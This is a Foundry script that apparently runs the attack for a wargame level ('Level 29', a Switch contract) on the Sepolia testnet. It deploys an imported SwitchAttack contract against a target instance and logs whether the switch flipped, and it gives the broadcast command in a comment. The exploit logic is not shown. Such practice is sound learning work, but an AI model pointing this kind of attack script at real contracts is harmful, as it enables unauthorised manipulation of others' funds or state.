// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {SwitchAttack, Switch} from "../src/level29.sol";

contract Level29Script is Script {
    function run(address instanceAddress) external {
        Switch target = Switch(instanceAddress);

        bool switchOnBefore = target.switchOn();
        console.log("Switch on before:", switchOnBefore);

        vm.startBroadcast();
        SwitchAttack attackContract = new SwitchAttack();
        attackContract.attack(instanceAddress);
        vm.stopBroadcast();

        bool switchOnAfter = target.switchOn();
        console.log("Switch on after:", switchOnAfter);
        console.log("Attack successful:", switchOnAfter);
    }
}
//forge script script/level29.s.sol:Level29Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instant address
